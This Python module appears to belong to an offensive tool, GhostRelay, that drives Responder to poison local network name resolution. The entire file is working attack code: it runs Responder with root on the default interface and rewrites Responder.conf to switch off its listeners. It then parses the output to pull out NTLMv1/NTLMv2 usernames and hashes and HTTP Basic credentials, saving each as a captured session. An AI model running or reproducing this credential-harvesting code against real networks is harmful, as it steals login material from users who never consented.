from __future__ import annotations

import os
import re
import shutil
import subprocess
import threading
import time
from typing import Optional

from ghostrelay.sessions import SESSION_STORE


RESPONDER_CONF = "/etc/responder/Responder.conf"
RESPONDER_CONF_BACKUP = "/etc/responder/Responder.conf.ghostrelay-backup"

RESPONDER_CANDIDATES = [
    "/usr/bin/responder",
    "/usr/bin/responder.py",
    "/usr/sbin/responder",
    "/usr/share/responder/Responder.py",
    "/usr/local/bin/responder",
]


def find_responder_path() -> str:
    for path in RESPONDER_CANDIDATES:
        if os.path.exists(path):
            return path

    auto = shutil.which("responder")
    if auto:
        return auto

    raise FileNotFoundError(
        "Responder executable not found. Tried: " + ", ".join(RESPONDER_CANDIDATES)
    )


RESPONDER_PATH = find_responder_path()


class ResponderManager:
    def __init__(self):
        self.process: Optional[subprocess.Popen] = None
        self.interface: Optional[str] = None
        self.running: bool = False

        self.last_source_ip = None
        self.last_dest_ip = None

        # Create ghostrelay.log in the ghostrelay/ directory (portable)
        base_dir = os.path.dirname(os.path.abspath(__file__))      # ghostrelay/
        self.log_path = os.path.join(base_dir, "ghostrelay.log")

        os.makedirs(base_dir, exist_ok=True)

        self.log_file = None

    # ---------------------------
    # Detect interface
    # ---------------------------
    def detect_interface(self) -> str:
        try:
            out = subprocess.check_output(
                "ip route | grep default | awk '{print $5}'",
                shell=True,
                text=True
            ).strip()

            if not out:
                raise RuntimeError("No default interface found")

            self.interface = out
            return out

        except Exception as e:
            raise RuntimeError(f"Interface detection failed: {e}")

    # ---------------------------
    def verify_responder(self):
        if not os.path.exists(RESPONDER_PATH):
            raise FileNotFoundError(f"Responder not found at {RESPONDER_PATH}")

        if not os.path.exists(RESPONDER_CONF):
            raise FileNotFoundError("Responder.conf missing in /etc/responder/")

    # ---------------------------
    def backup_config(self):
        if not os.path.exists(RESPONDER_CONF_BACKUP):
            shutil.copy(RESPONDER_CONF, RESPONDER_CONF_BACKUP)

    # ---------------------------
    def restore_config(self):
        if os.path.exists(RESPONDER_CONF_BACKUP):
            shutil.copy(RESPONDER_CONF_BACKUP, RESPONDER_CONF)

    # ---------------------------
    def patch_config_for_relay(self):
        with open(RESPONDER_CONF, "r") as f:
            text = f.read()

        patched = re.sub(r"(?i)(Enabled\s*=\s*)On", r"\1Off", text)

        with open(RESPONDER_CONF, "w") as f:
            f.write(patched)

    # ---------------------------
    def start_capture_mode(self):
        if os.geteuid() != 0:
            raise PermissionError("Run as sudo/root")

        self.verify_responder()
        iface = self.interface or self.detect_interface()
        self.backup_config()

        cmd = [RESPONDER_PATH, "-I", iface, "-wdv", "-v", "--verbose"]
        print(f"[GhostRelay] Starting capture mode: {' '.join(cmd)}")

        self._start_responder(cmd)

    # ---------------------------
    def _start_responder(self, cmd):
        self.running = True

        # Clean log file
        self.log_file = open(self.log_path, "w", encoding="utf8", buffering=1)

        self.process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        time.sleep(0.5)
        if self.process.poll() is not None:
            raise RuntimeError("Responder crashed immediately")

        threading.Thread(target=self._monitor_output, daemon=True).start()

    # ---------------------------
    def _monitor_output(self):
        ansi_re = re.compile(r"\x1B\[[0-9;]*[A-Za-z]")

        user = None

        for raw_line in self.process.stdout:
            clean = ansi_re.sub("", raw_line.rstrip("\n"))

            # Write clean log
            self.log_file.write(clean + "\n")

            # Extract IP
            m_ip = re.search(r"sent to ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", clean)
            if m_ip:
                self.last_source_ip = m_ip.group(1)

            # Extract service/resource
            m_service = re.search(r"service:\s*([A-Za-z0-9_\-]+)", clean)
            if m_service:
                self.last_dest_ip = m_service.group(1)

            # Username
            if (
                "NTLMv2-SSP Username" in clean
                or "NTLMv2 Username" in clean
                or "NTLMv1 Username" in clean
                or "HTTP Basic Authentication" in clean
            ):
                user = clean.split(":", 1)[1].strip()
                continue

            # Hash or credential
            if (
                "NTLMv2-SSP Hash" in clean
                or "Hash" in clean
                or "Basic Authentication" in clean
            ):
                if not user:
                    continue

                cred = clean.split(":", 1)[1].strip()

                SESSION_STORE.add_session(
                    source_ip=self.last_source_ip or "Responder",
                    dest_ip=self.last_dest_ip or "GhostRelay",
                    direction="capture",
                    raw_data=cred.encode(),
                    note=f"Credential ({user})"
                )

                user = None

        self.running = False

        try:
            self.log_file.close()
        except:
            pass

    # ---------------------------
    def stop_responder(self):
        if self.process:
            self.process.terminate()
            time.sleep(1)

        self.restore_config()
        self.running = False

